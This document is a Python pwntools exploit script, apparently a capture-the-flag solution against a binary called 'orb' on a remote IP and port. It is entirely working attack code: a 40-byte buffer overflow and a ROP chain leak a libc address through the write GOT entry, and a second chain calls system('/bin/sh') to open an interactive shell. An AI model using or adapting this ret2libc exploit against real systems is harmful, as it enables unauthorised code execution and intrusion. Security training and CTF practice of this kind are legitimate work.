#!/usr/bin/python3

from pwn import *

exe = ELF('orb', checksec=False)
libc = ELF('./glibc/libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x000000000040120e

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('94.237.59.185', 40161)
else:
        p = process(exe.path)

GDB()
payload = b''.ljust(40)
payload += flat(
        rop.find_gadget(['pop rdi', 'ret']).address, 1, 
        rop.find_gadget(['pop rsi','pop r15', 'ret']).address, exe.got.write, 0, 
        exe.plt.write, exe.sym.main
)
sla(b'Cast spell: ', payload)
p.recvuntil(b'to work..\n\n')
libc.address = u64(p.recvline()[1:9]) - 0x1100f0
info("Libc base: " + hex(libc.address))

payload = b''.ljust(40)
payload += flat(
        rop.find_gadget(['pop rdi', 'ret']).address, next(libc.search(b'/bin/sh')), libc.sym.system
)
sla(b'Cast spell: ', payload)
p.interactive()
